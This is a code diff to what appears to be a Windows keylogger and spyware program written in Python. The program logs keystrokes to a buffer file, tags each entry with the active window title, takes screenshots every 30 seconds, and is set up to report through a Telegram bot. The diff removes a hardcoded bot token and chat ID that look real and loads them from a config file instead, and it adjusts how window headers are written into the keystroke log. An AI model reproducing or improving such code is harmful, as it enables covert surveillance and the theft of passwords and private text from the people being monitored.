@@ -16,9 +16,12 @@ import ctypes
 from ctypes import wintypes
 
 # Telegram Monitoring configuration
-BOT_TOKEN = "8836300723:AAFkFTxToMDt3KtVb4nL-iLEYBou0Y22Nmk"
-CHAT_ID = "5904599269"
-SECRET_KEY = "247"
+try:
+    from config import BOT_TOKEN, CHAT_ID, SECRET_KEY
+except ImportError:
+    BOT_TOKEN = "YOUR_BOT_TOKEN"
+    CHAT_ID = "YOUR_CHAT_ID"
+    SECRET_KEY = "YOUR_SECRET_KEY"
 
 # Intervals in seconds
 SCREENSHOT_INTERVAL = 30
@@ -845,12 +848,12 @@ def on_press(key):
             if code < 32 and key_str not in ['\n', '\r', '\t']:
                 return
             
-        # Add active window/app header when user switches windows
+        # Add active window title header when user switches windows
         header_text = ""
-        current_win = f"[{proc_name} | {title}]" if (proc_name or title) else ""
-        if current_win and current_win != last_window_info:
-            last_window_info = current_win
-            header_text = f"\n\n[ {current_win} ]\n"
+        display_title = title if title else (proc_name[:-4] if proc_name.lower().endswith(".exe") else proc_name)
+        if display_title and display_title != last_window_info:
+            last_window_info = display_title
+            header_text = f"\n\n[ {display_title} ]\n"
 
         buffer_path = os.path.join(STORAGE, "keylog_buffer.txt")
         with open(buffer_path, "a", encoding="utf-8") as f:
